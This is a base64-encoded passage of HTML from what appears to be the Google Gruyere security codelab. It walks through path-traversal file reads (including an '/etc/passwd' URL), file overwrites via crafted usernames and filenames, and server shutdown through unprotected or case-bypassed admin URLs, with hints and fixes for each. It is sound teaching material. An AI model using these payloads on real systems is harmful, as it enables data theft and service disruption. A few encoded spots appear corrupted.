0sIHRoZW4gdGhleQpjYW4gY3JhZnQgYSBVUkwgdGhhdCB3aWxsIHRyYXZlcnNlIG91dCBvZiB0aGUgaW5zdGFsbGF0aW9uIGRpcmVjdG9yeQp0byA8Q09ERT4vZXRjPC9DT0RFPi4gRm9yIGV4YW1wbGUsIGlmIFBpY2FzYSB3YXMgdnVsbmVyYWJsZSB0byBwYXRoCnRyYXZlcnNhbCAoaXQgaXNuJ3QpIGFuZCB0aGUgUGljYXNhIHNlcnZlcnMgdXNlIGEgVW5peC1saWtlIHN5c3RlbSwKdGhlbiB0aGUgZm9sbG93aW5nIHdvdWxkIHJldHJpZXZlIHRoZSBwYXNzd29yZCBmaWxlOgo8L1A+CjxQPjwvUD4KPFBSRT4KaHR0cHM6Ly93d3cucGljYXNhLmNvbS8uLi8uLi8uLi8uLi8uLi8uLi8uLi9ldGMvcGFzc3dkCjwvUFJFPgo8UD48L1A+CjxQPjwvUD4KPEgzPjxBIG5hbWU9IjRfX2luZm9ybWF0aW9uX2Rpc2Nsb3N1cmVfcGF0aF90cmF2ZXJzYWwiPiA8L0E+IEluZm9ybWF0aW9uCmRpc2Nsb3N1cmUgdmlhIHBhdGggdHJhdmVyc2FsIDwvSDM+CjxQPgo8SU1HIHNyYz0iL3N0YXRpYy9jaGVlc2VfYncucG5nIiBzdHlsZT0idmVydGljYWwtYWxpZ246bWlkZGxlOwpwYWRkaW5nLXJpZ2h0OiA1cHg7Ij4gPEI+RmluZCBhIHdheSB0byByZWFkIDxDT0RFPnNlY3JldC50eHQ8L0NPREU+IGZyb20KYSBydW5uaW5nIEdydXllcmUgc2VydmVyLjwvQj4KPC9QPgo8UD4gQW1hemluZ2x5LCB0aGlzIGF0dGFjayBpcyBub3QgZXZlbiBuZWNlc3NhcnkgaW4gbWFueSBjYXNlczoKcGVvcGxlIG9mdGVuIGluc3RhbGwgYXBwbGljYXRpb25zIGFuZCBuZXZlciBjaGFuZ2UgdGhlIGRlZmF1bHRzLiBTbwp0aGUgZmlyc3QgdGhpbmcgYW4gYXR0YWNrZXIgd291bGQgdHJ5IGlzIHRoZSBkZWZhdWx0IHZhbHVlLgo8L1A+CjxESVYgc3R5bGU9Im1hcmdpbi1sZWZ0OjE4cHQiPgo8SDQgc3R5bGU9ImN1cnNvcjogcG9pbnRlciIgb25jbGljaz0idG9nZ2xlQmxvY2sodGhpcywgJ3JlYWRfc2VjcmV0X3R4dF9oaW50Jyk7Ij48SU1HIHNyYz0iL3N0YXRpYy9jbG9zZWQuZ2lmIj4gSGludCAxIDwvSDQ+CjxESVYgaWQ9InJlYWRfc2VjcmV0X3R4dF9oaW50IiBzdHlsZT0iZGlzcGxheTpub25lIj4KPFA+ClRoaXMgaXNuJ3QgYSBibGFjayBib3ggYXR0YWNrIGJlY2F1c2UgeW91IG5lZWQgdG8ga25vdyB0aGF0CnRoZSA8Q09ERT5zZWNyZXQudHh0PC9DT0RFPiBmaWxlIGV4aXN0cywgd2hlcmUgaXQncyBzdG9yZWQsIGFuZCB3aGVyZQpHcnV5ZXJlIHN0b3JlcyBpdHMgcmVzb3VyY2UgZmlsZXMuIFlvdSBkb24ndCBuZWVkIHRvIGxvb2sgYXQgYW55CnNvdXJjZSBjb2RlLgo8L1A+CjxQPjwvUD4KPC9ESVY+CjxQPjwvUD4KPEg0IHN0eWxlPSJjdXJzb3I6IHBvaW50ZXIiIG9uY2xpY2s9InRvZ2dsZUJsb2NrKHRoaXMsICdyZWFkX3NlY3JldF90eHRfaGludDInKTsiPjxJTUcgc3JjPSIvc3RhdGljL2Nsb3NlZC5naWYiPiBIaW50IDIgPC9IND4KPERJViBpZD0icmVhZF9zZWNyZXRfdHh0X2hpbnQyIiBzdHlsZT0iZGlzcGxheTpub25lIj4KPFA+CkhvdyBkb2VzIHRoZSBzZXJ2ZXIga25vdyB3aGljaCBVUkxzIHJlcHJlc2VudCByZXNvdXJjZSBmaWxlcz8gWW91IGNhbgp1c2UgY3VybCBvciBhIHdlYiBwcm94eSB0byBjcmFmdCByZXF1ZXN0IFVSTHMgdGhhdCBzb21lIGJyb3dzZXJzIG1heQpub3QgYWxsb3cuCjwvUD4KPFA+PC9QPgo8L0RJVj4KPFA+PC9QPgo8SDQgc3R5bGU9ImN1cnNvcjogcG9pbnRlciIgb25jbGljaz0idG9nZ2xlQmxvY2sodGhpcywgJ3JlYWRfc2VjcmV0X3R4dF9zb2wnKTsiPjxJTUcgc3JjPSIvc3RhdGljL2Nsb3NlZC5naWYiPiBFeHBsb2l0IGFuZCBGaXggPC9IND4KPERJViBpZD0icmVhZF9zZWNyZXRfdHh0X3NvbCIgc3R5bGU9ImRpc3BsYXk6bm9uZSI+CjxQPgo8Qj5UbyBleHBsb2l0LDwvQj4geW91IGNhbiBzdGVhbCA8Q09ERT5zZWNyZXQudHh0PC9DT0RFPiB2aWEKdGhpcyBVUkw6CjwvUD4KPFA+PC9QPgo8UFJFPgpodHRwczovL2dvb2dsZS1ncnV5ZXJlLmFwcHNwb3QuY29tLzQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNi8uLi9zZWNyZXQudHh0CjwvUFJFPgo8UD4KU29tZSBicm93c2VycywgbGlrZSBGaXJlZm94IGFuZCBDaHJvbWUsIG9wdGltaXplIG91dCA8Q09ERT4uLi88L0NPREU+CmluIFVSTHMuIFRoaXMgZG9lc24ndCBwcm92aWRlIGFueSBzZWN1cml0eSBwcm90ZWN0aW9uIGJlY2F1c2UgYW4KYXR0YWNrZXIgd2lsbCB1c2UgPENPREU+JTJmPC9DT0RFPiB0byByZXByZXNlbnQgPENPREU+LzwvQ09ERT4gaW4gdGhlIFVSTDsKb3IgYSB0b29sIGxpa2UgY3VybCwgYSB3ZWIgcHJveHkgb3IgYSBicm93c2VyIHRoYXQKZG9lc24ndCBkbyB0aGF0IG9wdGltaXphdGlvbi4gQnV0IGlmIHlvdSB0ZXN0IHlvdXIgYXBwbGljYXRpb24gd2l0aApvbmUgb2YgdGhlc2UgYnJvd3NlcnMgdG8gc2VlIGlmIHlvdSdyZSB2dWxuZXJhYmxlLCB5b3UgbWlnaHQgdGhpbmsgeW91CndlcmUgcHJvdGVjdGVkIHdoZW4geW91J3JlIG5vdC4KPC9QPgo8UD4KPEI+VG8gZml4LDwvQj4gd2UgbmVlZCB0byBwcmV2ZW50IGFjY2VzcyB0byBmaWxlcyBvdXRzaWRlCnRoZSByZXNvdXJjZXMgZGlyZWN0b3J5LiAgVmFsaWRhdGluZyBmaWxlIHBhdGhzIGlzIGEgYml0IHRyaWNreSBhcwp0aGVyZSBhcmUgdmFyaW91cyB3YXlzIHRvIGhpZGUgcGF0aCBlbGVtZW50cyBsaWtlICIuLi8iIG9yICJ+IiB0aGF0CmFsbG93IGVzY2FwaW5nIG91dCBvZiB0aGUgcmVzb3VyY2VzIGZvbGRlci4gVGhlIGJlc3QgcHJvdGVjdGlvbiBpcyB0bwpvbmx5IHNlcnZlIHNwZWNpZmljIHJlc291cmNlIGZpbGVzLiBZb3UgY2FuIGVpdGhlciBoYXJkY29kZSBhIGxpc3Qgb3IKd2hlbiB5b3VyIGFwcGxpY2F0aW9uIHN0YXJ0cywgeW91IGNhbiBjcmF3bCB0aGUgcmVzb3VyY2UgZGlyZWN0b3J5IGFuZApidWlsZCBhIGxpc3Qgb2YgZmlsZXMuIFRoZW4gb25seSBhY2NlcHQgcmVxdWVzdHMgZm9yIHRob3NlIGZpbGVzLiBZb3UKY2FuIGV2ZW4gZG8gc29tZSBvcHRpbWl6YXRpb24gaGVyZSBsaWtlIGNhY2hpbmcgc21hbGwgZmlsZXMgaW4gbWVtb3J5CndoaWNoIHdpbGwgbWFrZSB5b3VyIGFwcGxpY2F0aW9uIGZhc3Rlci4gSWYgeW91IGFyZSBnb2luZyB0byB0cnkgdG8KZmlsZSBwYXRoIHZhbGlkYXRpb24sIHlvdSBuZWVkIHRvIGRvIGl0IG9uIHRoZSBmaW5hbCBwYXRoLCBub3Qgb24gdGhlClVSTCwgYXMgdGhlcmUgYXJlIG51bWVyb3VzIHdheXMgdG8gcmVwcmVzZW50IHRoZSBzYW1lIGNoYXJhY3RlcnMgaW4KVVJMcy4gPEk+Tm90ZTogQ2hhbmdpbmcgZmlsZSBwZXJtaXNzaW9ucyB3aWxsIE5PVCB3b3JrLiBHcnV5ZXJlIGhhcwp0byBiZSBhYmxlIHRvIHJlYWQgdGhpcyBmaWxlLjwvST4KPC9QPgo8UD48L1A+CjwvRElWPgo8L0RJVj4KPFA+PC9QPgo8SDM+PEEgbmFtZT0iNF9fZGF0YV90YW1wZXJpbmdfcGF0aF90cmF2ZXJzYWwiPiA8L0E+IERhdGEKdGFtcGVyaW5nIHZpYSBwYXRoIHRyYXZlcnNhbCA8L0gzPgo8UD4KPElNRyBzcmM9Ii9zdGF0aWMvY2hlZXNlX2J3LnBuZyIgc3R5bGU9InZlcnRpY2FsLWFsaWduOm1pZGRsZTsKcGFkZGluZy1yaWdodDogNXB4OyI+IDxCPkZpbmQgYSB3YXkgdG8gcmVwbGFjZSA8Q09ERT5zZWNyZXQudHh0PC9DT0RFPiBvbgphIHJ1bm5pbmcgR3J1eWVyZSBzZXJ2ZXIuPC9CPgo8L1A+CjxQPjwvUD4KPERJViBzdHlsZT0ibWFyZ2luLWxlZnQ6MThwdCI+CjxINCBzdHlsZT0iY3Vyc29yOiBwb2ludGVyIiBvbmNsaWNrPSJ0b2dnbGVCbG9jayh0aGlzLCAnd3JpdGVfc2VjcmV0X3R4dF9oaW50Jyk7Ij48SU1HIHNyYz0iL3N0YXRpYy9jbG9zZWQuZ2lmIj4gSGludCAxIDwvSDQ+CjxESVYgaWQ9IndyaXRlX3NlY3JldF90eHRfaGludCIgc3R5bGU9ImRpc3BsYXk6bm9uZSI+CjxQPgpBZ2FpbiwgdGhpcyBpc24ndCBhIGJsYWNrIGJveCBhdHRhY2sgYmVjYXVzZSB5b3UgbmVlZCB0byBrbm93IGFib3V0CnRoZSBkaXJlY3Rvcnkgc3RydWN0dXJlIHRoYXQgR3J1eWVyZSB1c2VzLCBzcGVjaWZpY2FsbHkgd2hlcmUKdXBsb2FkZWQgZmlsZXMgYXJlIHN0b3JlZC4KPC9QPgo8UD48L1A+CjwvRElWPgo8UD48L1A+CjxINCBzdHlsZT0iY3Vyc29yOiBwb2ludGVyIiBvbmNsaWNrPSJ0b2dnbGVCbG9jayh0aGlzLCAnd3JpdGVfc2VjcmV0X3R4dF9oaW50MicpOyI+PElNRyBzcmM9Ii9zdGF0aWMvY2xvc2VkLmdpZiI+IEhpbnQgMiA8L0g0Pgo8RElWIGlkPSJ3cml0ZV9zZWNyZXRfdHh0X2hpbnQyIiBzdHlsZT0iZGlzcGxheTpub25lIj4KPFA+CklmIEkgbG9nIGluIGFzIHVzZXIgPENPREU+YnJpZTwvQ09ERT4gYW5kIHVwbG9hZCBhIGZpbGUsIHdoZXJlIGRvZXMKdGhlIHNlcnZlciBzdG9yZSBpdD8gQ2FuIHlvdSB0cmljayB0aGUgc2VydmVyIGludG8gdXBsb2FkaW5nIGEgZmlsZQp0byA8Q09ERT4uLi8uLi9zZWNyZXQudHh0PC9DT0RFPj8KPC9QPgo8UD48L1A+CjwvRElWPgo8UD48L1A+CjxINCBzdHlsZT0iY3Vyc29yOiBwb2ludGVyIiBvbmNsaWNrPSJ0b2dnbGVCbG9jayh0aGlzLCAnd3JpdGVfc2VjcmV0X3R4dF9zb2wnKTsiPjxJTUcgc3JjPSIvc3RhdGljL2Nsb3NlZC5naWYiPiBFeHBsb2l0IGFuZCBGaXggPC9IND4KPERJViBpZD0id3JpdGVfc2VjcmV0X3R4dF9zb2wiIHN0eWxlPSJkaXNwbGF5Om5vbmUiPgo8UD4KPEI+VG8gZXhwbG9pdCw8L0I+IGNyZWF0ZSBhIG5ldyB1c2VyIG5hbWVkIDxDT0RFPi4uPC9DT0RFPgphbmQgdXBsb2FkIHlvdXIgbmV3IDxDT0RFPnNlY3JldC50eHQ8L0NPREU+LiBZb3UgY291bGQgYWxzbyBjcmVhdGUgYQp1c2VyIG5hbWVkIDxDT0RFPmJyaWUvLi4vLi48L0NPREU+Lgo8L1A+CjxQPgo8Qj5UbyBmaXgsPC9CPiB5b3Ugc2hvdWxkIGVzY2FwZSBkYW5nZXJvdXMgY2hhcmFjdGVycyBpbiB0aGUgdXNlcm5hbWUKKHJlcGxhY2luZyB0aGVtIHdpdGggc2FmZSBjaGFyYWN0ZXJzKSBiZWZvcmUgdXNpbmcgaXQuIEl0IHdhcyBlYXJsaWVyCnN1Z2dlc3RlZCB0aGF0IHdlIHNob3VsZCByZXN0cmljdCB0aGUgY2hhcmFjdGVycyBhbGxvd2VkIGluIGEgdXNlcm5hbWUsCmJ1dCBpdCBwcm9iYWJseSBkaWRuJ3Qgb2NjdXIgdG8geW91IHRoYXQgPENPREU+Ii4iPC9DT0RFPiB3YXMgYQpkYW5nZXJvdXMgY2hhcmFjdGVyLiAgSXQncyB3b3J0aCBub3RpbmcgdGhhdCB0aGVyZSdzIGEgdnVsbmVyYWJpbGl0eQp1bmlxdWUgdG8gV2luZG93cyBzZXJ2ZXJzIHdpdGggdGhpcyBpbXBsZW1lbnRhdGlvbi4gT24gV2luZG93cywKZmlsZW5hbWVzIGFyZSBub3QgY2FzZSBzZW5zaXRpdmUgYnV0IEdydXllcmUgdXNlcm5hbWVzIGFyZS4gU28gb25lCnVzZXIgY2FuIGF0dGFjayBhbm90aGVyIHVzZXIncyBmaWxlcyBieSBjcmVhdGluZyBhIHNpbWlsYXIgdXNlcm5hbWUKdGhhdCBkaWZmZXJzIG9ubHkgaW4gY2FzZSwgZS5nLiwgPENPREU+QlJJRTwvQ09ERT4gaW5zdGVhZApvZiA8Q09ERT5icmllPC9DT0RFPi4gU28gd2UgbmVlZCB0byBub3QganVzdCBlc2NhcGUgdW5zYWZlIGNoYXJhY3RlcnMKYnV0IGNvbnZlcnQgdGhlIHVzZXJuYW1lIHRvIGEgY2Fub25pY2FsIGZvcm0gdGhhdCBpcyBkaWZmZXJlbnQgZm9yCmRpZmZlcmVudCB1c2VybmFtZXMuIE9yIHdlIGNvdWxkIGF2b2lkIGFsbCB0aGVzZSBpc3N1ZXMgYnkgYXNzaWduaW5nCmVhY2ggdXNlciBhIHVuaXF1ZSBpZGVudGlmaWVyIGluc3RlYWQuCjwvUD4KPFA+CjxCPk9vcHMhPC9CPiBUaGlzIGRvZXNuJ3QgY29tcGxldGVseSBzb2x2ZSB0aGUgcHJvYmxlbS4gRXZlbiB3aXRoIHRoZQphYm92ZSBmaXggaW4gcGxhY2UsIHRoZXJlIGlzIGFub3RoZXIgd2F5IHRvIHBlcmZvcm0gdGhpcyBhdHRhY2suIENhbgp5b3UgZmluZCBpdD8KPEg0IHN0eWxlPSJjdXJzb3I6IHBvaW50ZXIiIG9uY2xpY2s9InRvZ2dsZUJsb2NrKHRoaXMsICdhbm90aGVyX3dyaXRlX3NlY3JldF9oaW50Jyk7Ij48SU1HIHNyYz0iL3N0YXRpYy9jbG9zZWQuZ2lmIj4gSGludCA8L0g0Pgo8RElWIGlkPSJhbm90aGVyX3dyaXRlX3NlY3JldF9oaW50IiBzdHlsZT0iZGlzcGxheTpub25lIj4KPFA+CkFyZSB0aGVyZSBhbnkgbGltaXRzIG9uIHRoZSBmaWxlbmFtZSB3aGVuIHlvdSBkbyBhbiB1cGxvYWQ/ICBZb3UgbWF5Cm5lZWQgdG8gdXNlIGEgc3BlY2lhbCB0b29sIGxpa2UgPENPREU+Y3VybDwvQ09ERT4gb3IgYSB3ZWIgcHJveHkgdG8KcGVyZm9ybSB0aGlzIGF0dGFjay4KPC9QPgo8UD48L1A+CjwvRElWPgo8L1A+CjxINCBzdHlsZT0iY3Vyc29yOiBwb2ludGVyIiBvbmNsaWNrPSJ0b2dnbGVCbG9jayh0aGlzLCAnd3JpdGVfc2VjcmV0X3R4dF9zb2wyJyk7Ij48SU1HIHNyYz0iL3N0YXRpYy9jbG9zZWQuZ2lmIj4gQW5vdGhlciBFeHBsb2l0IGFuZCBGaXggPC9IND4KPERJViBpZD0id3JpdGVfc2VjcmV0X3R4dF9zb2wyIiBzdHlsZT0iZGlzcGxheTpub25lIj4KPFA+IFN1cnByaXNpbmdseSwgeW91IGNhbiB1cGxvYWQgYSBmaWxlCm5hbWVkIDxDT0RFPi4uL3NlY3JldC50eHQ8L0NPREU+LiBHcnV5ZXJlIHByb3ZpZGVzIG5vIHByb3RlY3Rpb24KYWdhaW5zdCB0aGlzIGF0dGFjay4gTW9zdCBicm93c2VycyB3b24ndCBsZXQgeW91IHVwbG9hZCB0aGF0IGZpbGUgYnV0LAphZ2FpbiwgeW91IGNhbiBkbyBpdCB3aXRoIGN1cmwgb3Igb3RoZXIgdG9vbHMuIFlvdSBuZWVkIHRoZSBzYW1lIGtpbmQKb2YgcHJvdGVjdGlvbiB3aGVuIHdyaXRpbmcgZmlsZXMgYXMgeW91IGRvIG9uIHJlYWQuCjwvUD4KPFA+IEFzIGEgZ2VuZXJhbCBydWxlLCB5b3Ugc2hvdWxkIG5ldmVyIHN0b3JlIHVzZXIgZGF0YSBpbiB0aGUKc2FtZSBwbGFjZSBhcyB5b3VyIGFwcGxpY2F0aW9uIGZpbGVzIGJ1dCB0aGF0IGFsb25lIHdvbid0IHByb3RlY3QKYWdhaW5zdCB0aGVzZSBhdHRhY2tzIHNpbmNlIGlmIHRoZSB1c2VyIGNhbiBpbmplY3QgPENPREU+Li4vPC9DT0RFPgppbnRvIHRoZSBmaWxlIHBhdGgsIHRoZXkgY2FuIHRyYXZlcnNlIGFsbCB0aGUgd2F5IHRvIHRoZSByb290IG9mIHRoZQpmaWxlIHN5c3RlbSBhbmQgdGhlbiBiYWNrIGRvd24gdG8gdGhlIG5vcm1hbCBpbnN0YWxsIGxvY2F0aW9uIG9mIHlvdXIKYXBwbGljYXRpb24gKG9yIGV2ZW4gdGhlIFB5dGhvbiBpbnRlcnByZXRlciBpdHNlbGYpLgo8L1A+PC9ESVY+PC9ESVY+CjwvRElWPgo8QlI+PFA+PC9QPgo8SDI+PEEgbmFtZT0iNF9fZGVuaWFsX29mX3NlcnZpY2UiPiA8L0E+IERlbmlhbCBvZiBTZXJ2aWNlIDwvSDI+CjxQPgpBIGRlbmlhbCBvZiBzZXJ2aWNlIChEb1MpIGF0dGFjayBpcyBhbiBhdHRlbXB0IHRvIG1ha2UgYSBzZXJ2ZXIgdW5hYmxlCnRvIHNlcnZpY2Ugb3JkaW5hcnkgcmVxdWVzdHMuIEEgY29tbW9uIGZvcm0gb2YgRG9TIGF0dGFjayBpcyBzZW5kaW5nCm1vcmUgcmVxdWVzdHMgdG8gYSBzZXJ2ZXIgdGhhbiBpdCBjYW4gaGFuZGxlLiBUaGUgc2VydmVyIHNwZW5kcyBhbGwKaXRzIHRpbWUgc2VydmljaW5nIHRoZSBhdHRhY2tlcidzIHJlcXVlc3RzIHRoYXQgaXQgaGFzIHZlcnkgbGl0dGxlCnRpbWUgdG8gc2VydmljZSBsZWdpdGltYXRlIHJlcXVlc3RzLiBQcm90ZWN0aW5nIGFuIGFwcGxpY2F0aW9uIGFnYWluc3QKdGhlc2Uga2luZHMgb2YgRG9TIGF0dGFja3MgaXMgb3V0c2lkZSB0aGUgc2NvcGUgb2YgdGhpcyBjb2RlbGFiLiBBbmQKYXR0YWNraW5nIEdydXllcmUgaW4gdGhpcyB3YXkgd291bGQgYmUgaW50ZXJwcmV0ZWQgYXMgYW4gYXR0YWNrIG9uCkFwcCZuYnNwO0VuZ2luZS4KPC9QPjxQPiBIYWNrZXJzIGNhbiBhbHNvIHByZXZlbnQgYSBzZXJ2ZXIgZnJvbSBzZXJ2aWNpbmcgcmVxdWVzdHMgYnkKdGFraW5nIGFkdmFudGFnZSBvZiBzZXJ2ZXIgYnVncywgc3VjaCBhcyBzZW5kaW5nIHJlcXVlc3RzIHRoYXQgY3Jhc2ggYQpzZXJ2ZXIsIG1ha2UgaXQgcnVuIG91dCBvZiBtZW1vcnksIG9yIG90aGVyd2lzZSBjYXVzZSBpdCBmYWlsIHNlcnZpbmcKbGVnaXRpbWF0ZSByZXF1ZXN0cyBpbiBzb21lIHdheS4gSW4gdGhlIG5leHQgZmV3IGNoYWxsZW5nZXMsIHlvdSdsbAp0YWtlIGFkdmFudGFnZSBvZiBidWdzIGluIEdydXllcmUgdG8gcGVyZm9ybSBEb1MgYXR0YWNrcy4KPC9QPgo8SDM+PEEgbmFtZT0iNF9fZG9zX3F1aXRfc2VydmVyIj4gPC9BPiBEb1MgLSBRdWl0IHRoZSBTZXJ2ZXIgPC9IMz4KVGhlIHNpbXBsZXN0IGZvcm0gb2YgZGVuaWFsIG9mIHNlcnZpY2UgaXMgc2h1dHRpbmcgZG93biBhIHNlcnZpY2UuCjxQPgo8SU1HIHNyYz0iL3N0YXRpYy9jaGVlc2VfYncucG5nIiBzdHlsZT0idmVydGljYWwtYWxpZ246bWlkZGxlOwpwYWRkaW5nLXJpZ2h0OiA1cHg7Ij4gPEI+RmluZCBhIHdheSB0byBtYWtlIHRoZSBzZXJ2ZXIgcXVpdC48L0I+CjwvUD4KPFA+PC9QPgo8RElWIHN0eWxlPSJtYXJnaW4tbGVmdDoxOHB0Ij4KPEg0IHN0eWxlPSJjdXJzb3I6IHBvaW50ZXIiIG9uY2xpY2s9InRvZ2dsZUJsb2NrKHRoaXMsICdkb3NfcXVpdF9oaW50Jyk7Ij48SU1HIHNyYz0iL3N0YXRpYy9jbG9zZWQuZ2lmIj4gSGludCA8L0g0Pgo8RElWIGlkPSJkb3NfcXVpdF9oaW50IiBzdHlsZT0iZGlzcGxheTpub25lIj4KPFA+CkhvdyBkb2VzIGFuIGFkbWluaXN0cmF0b3IgbWFrZSB0aGUgc2VydmVyIHF1aXQ/IFRoZSBzZXJ2ZXIgbWFuYWdlbWVudApwYWdlIGlzIDxDT0RFPjxBIGhyZWY9Ii9jb2RlLz9yZXNvdXJjZXMvbWFuYWdlLmd0bCI+bWFuYWdlLmd0bDwvQT48L0NPREU+Lgo8L1A+CjxQPjwvUD4KPC9ESVY+CjxQPjwvUD4KPEg0IHN0eWxlPSJjdXJzb3I6IHBvaW50ZXIiIG9uY2xpY2s9InRvZ2dsZUJsb2NrKHRoaXMsICdkb3NfcXVpdF9zb2xuJyk7Ij48SU1HIHNyYz0iL3N0YXRpYy9jbG9zZWQuZ2lmIj4gRXhwbG9pdCBhbmQgRml4IDwvSDQ+CjxESVYgaWQ9ImRv9xdWl0X3NvbG4iIHN0eWxlPSJkaXNwbGF5Om5vbmUiPgo8UD4KPEI+VG8gZXhwbG9pdCw8L0I+IG1ha2UgYSByZXF1ZXN0CnRvIDxDT0RFPmh0dHBzOi8vZ29vZ2xlLWdydXllcmUuYXBwc3BvdC5jb20vNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2L3F1aXRzZXJ2ZXI8L0NPREU+LiBZb3UKc2hvdWxkIG5lZWQgdG8gYmUgbG9nZ2VkIGluIGFzIGFuIGFkbWluaXN0cmF0b3IgdG8gZG8gdGhpcywgYnV0IHlvdQpkb24ndC4KPC9QPjxQPgpUaGlzIGlzIGFub3RoZXIgZXhhbXBsZSBvZiBhIGNvbW1vbiBidWcuIFRoZSBzZXJ2ZXIgcHJvdGVjdHMKYWdhaW5zdCBub24tYWRtaW5pc3RyYXRvcnMgYWNjZXNzaW5nIGNlcnRhaW4gVVJMcyBidXQgdGhlIGxpc3QKaW5jbHVkZXMgPENPREU+L3F1aXQ8L0NPREU+IGluc3RlYWQgb2YgdGhlIGFjdHVhbApVUkwgPENPREU+L3F1aXRzZXJ2ZXI8L0NPREU+Lgo8L1A+CjxQPgo8Qj5UbyBmaXgsPC9CPiBhZGQgPENPREU+L3F1aXRzZXJ2ZXI8L0NPREU+IHRvIHRoZSBVUkxTIG9ubHkKYWNjZXNzaWJsZSB0byBhZG1pbmlzdHJhdG9yczoKPC9QPjxQUkU+Cl9QUk9URUNURURfVVJMUyA9IFsKICAgICIvcXVpdHNlcnZlciIsCiAgICAiL3Jlc2V0IgpdCjwvUFJFPgo8UD4KPCEtLU1BUkstQS0tPgo8Qj5Pb3BzITwvQj4gVGhpcyBkb2Vzbid0IGNvbXBsZXRlbHkgc29sdmUgdGhlIHByb2JsZW0uClRoZSA8Q09ERT5yZXNldDwvQ09ERT4gVVJMIGlzIGluIHRoZSBwcm90ZWN0ZWQgbGlzdC4gQ2FuIHlvdSBmaWd1cmUKb3V0IGhvdyB0byBhY2Nlc3MgaXQ/CjwvUD4KPEg0IHN0eWxlPSJjdXJzb3I6IHBvaW50ZXIiIG9uY2xpY2s9InRvZ2dsZUJsb2NrKHRoaXMsICdkb3NfYm9udXNfaGludCcpOyI+PElNRyBzcmM9Ii9zdGF0aWMvY2xvc2VkLmdpZiI+IEhpbnQgPC9IND4KPERJViBpZD0iZG9zX2JvbnVzX2hpbnQiIHN0eWxlPSJkaXNwbGF5Om5vbmUiPgo8UD4KTG9vayBjYXJlZnVsbHkgYXQgdGhlIGNvZGUgdGhhdCBoYW5kbGVzIFVSTHMgYW5kIGNoZWNrcyBmb3IgcHJvdGVjdGVkIG9uZXMuCjwvUD48L0RJVj4KPFA+PC9QPgo8SDQgc3R5bGU9ImN1cnNvcjogcG9pbnRlciIgb25jbGljaz0idG9nZ2xlQmxvY2sodGhpcywgJ2Rv9ib2519zb2xuJyk7Ij48SU1HIHNyYz0iL3N0YXRpYy9jbG9zZWQuZ2lmIj4gQW5vdGhlciBFeHBsb2l0IGFuZCBGaXggPC9IND4KPERJViBpZD0iZG9zX2JvbnVzX3NvbG4iIHN0eWxlPSJkaXNwbGF5Om5vbmUiPgo8UD4KPEI+VG8gZXhwbG9pdCw8L0I+CnVzZSA8Q09ERT5odHRwczovL2dvb2dsZS1ncnV5ZXJlLmFwcHNwb3QuY29tLzQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNi9SRVNFVDwvQ09ERT4uIFRoZSBjaGVjayBmb3IKcHJvdGVjdGVkIHVybHMgaXMgY2FzZSBzZW5zaXRpdmUuIEFmdGVyIGRvaW5nIHRoYXQgY2hlY2ssIGl0CmNhcGl0YWxpemVzIHRoZSBzdHJpbmcgdG8gbG9vayB1cCB0aGUgaW1wbGVtZW50YXRpb24uIFRoaXMgaXMgYQpjbGFzc2ljIGNoZWNrL3VzZSBidWcgd2hlcmUgdGhlIGNvbmRpdGlvbiBiZWluZyBjaGVja2VkIGRvZXMgbm90IG1hdGNoCnRoZSBhY3R1YWwgdXNlLiBUaGlzIHZ1bG5lcmFiaWxpdHkgaXMgd29yc2UgdGhhbiB0aGUgcHJldmlvdXMgb25lCmJlY2F1c2UgaXQgZXhwb3NlcyBhbGwgdGhlIHByb3RlY3RlZCB1cmxzLgo8L1A+PFA+CjxCPlRvIGZpeCw8L0I+IHB1dCB0aGUgc2VjdXJpdHkgY2hlY2sgaW5zaWRlIHRoZSBkYW5nZXJvdXMKZnVuY3Rpb25zIHJhdGhlciB0aGFuIG91dHNpZGUgdGhlbS4gVGhhdCBlbnN1cmVzIHRoYXQgbm8gbWF0dGVyIGhvdyB3ZQpnZXQgdGhlcmUsIHRoZSBzZWN1cml0eSBjaGVjayBjYW4ndCBiZSBza2lwcGVkLgo8L1A+PC9ESVY+CjwvRElWPgo8L0RJVj4KPFA+CjxIMz48QSBuYW1lPSI0X19kb3Nfb3ZlcmxvYWRfc2VydmVyIj48L0E+IERvUyAtIE92ZXJsb2FkaW5nIHRoZSBTZXJ2ZXIgPC9IMz4KPFA+CjxJTUcgc3JjPSIvc3RhdGljL2NoZWVzZV9iLnBuZyIgc3R5bGU9InZlcnRpY2FsLWFsaWduOm1pZGRsZTsKcGFkZGluZy1yaWdodDogNXB4OyI+IDxCPkZpbmQgYSB3YXkgdG8gb3ZlcmxvYWQgdGhlIHNlcnZlciB3aGVuIGl0IHByb2Nlc3NlcyBhIHJlcXVlc3QuPC9CPgo8L1A+CjxQPjwvUD4KPERJViBzdHlsZT0ibWFyZ2luLWxlZnQ6MThwdCI+CjxINCBzdHlsZT0iY3Vyc29yOiBwb2ludGVyIiBvbmNsaWNrPSJ0b2dnbGVCbG9jayh0aGlzLCAnZG9zX292ZXJsb2FkX2hpbnQxJyk7Ij48SU1HIHNyYz0iL3N0YXRpYy9jbG9zZWQuZ2lmIj4gSGludCAxIDwvSDQ+CjxESVYgaWQ9ImRv9vdmVybG9hZF9oaW50MSIgc3R5bGU9ImRpc3BsYXk6bm9uZSI+CjxQPgpZb3UgY2FuIHVwbG9hZCBhIHRlbXBsYXRlIHRoYXQgZG9lcyB0aGlzLgo8L1A+PC9ESVY+CjxINCBzdHlsZT0iY3Vyc29yOiBwb2ludGVyIiBvbmNsaWNrPSJ0b2dnbGVCbG9jayh0aGlzLCAnZG9zX292ZXJsb2FkX2hpbnQyJyk7Ij48SU1HIHNyYz0iL3N0YXRpYy9jbG9zZWQuZ2lmIj4gSGludCAyIDwvSDQ+CjxESVYgaWQ9ImRv9vdmVybG9hZF9oaW50MiIgc3R5bGU9ImRpc3BsYXk6bm9uZSI+CjxQPgpFdmVyeSBwYWdlIGluY2x1ZGVzCnRoZSA8Q09ERT48QSBocmVmPSIvY29kZS8/cmVzb3VyY2VzL21lbnViYXIuZ3RsIj5tZW51YmFyLmd0bDwvQT48L0NPREU+CnRlbXBsYXRlLiBDYW4geW91IGZpZ3VyZSBvdXQgaG93IHRvIG1ha2UgdGhhdCB0ZW1wbGF0ZSBvdmVybG9hZCB0aGUKc2VydmVyPwo8L1A+PC9ESVY+CjxINCBzdHlsZT0iY3Vyc